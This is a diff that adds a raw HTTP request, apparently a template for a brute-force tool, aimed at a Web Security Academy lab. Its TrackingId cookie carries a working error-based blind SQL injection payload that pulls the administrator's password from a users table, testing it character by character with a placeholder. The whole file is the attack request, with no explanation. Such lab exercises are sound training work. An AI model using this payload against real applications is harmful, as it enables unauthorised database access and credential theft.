@@ -1,0 +1,12 @@
+GET /filter?category=Gifts HTTP/1.1
+Host: acf41f881fefa9ed808d250a00920068.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acf41f881fefa9ed808d250a00920068.web-security-academy.net/filter?category=Tech+gifts
+DNT: 1
+Connection: close
+Cookie: TrackingId=gS6keNR7HhTAWeh41'+union+select+case+when+(username+%3d+'administrator'+and+password+like+'$$PAYLOAD$$%25')+then+to_char(1/0)+else+null+end+from+users--+; session=5rUSkettdqMbduTNUWOYdevK52vTO2UF
+Upgrade-Insecure-Requests: 1
+
